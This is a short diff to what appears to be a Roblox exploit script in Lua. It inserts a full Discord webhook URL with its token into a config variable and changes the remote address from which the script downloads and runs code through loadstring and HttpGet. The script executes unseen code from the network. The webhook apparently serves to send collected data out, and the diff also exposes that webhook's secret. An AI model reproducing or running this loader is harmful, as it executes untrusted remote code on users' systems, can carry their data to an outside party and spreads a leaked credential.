@@ -1,6 +1,6 @@
 
-getgenv().DiscordWebhook = "" -- Discord Webhook Here
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1025246882831814727/_6Ny4XjWz-sK2_F88oOoPewcTfPcFvmNbvyjBMFkNlcOrJKl9jQaN0qgMGHvGqj1fyGu"
 getgenv().embedcolor = "0xf54747" 
 
 
-loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/loganonline/webhook2/main/main"))()
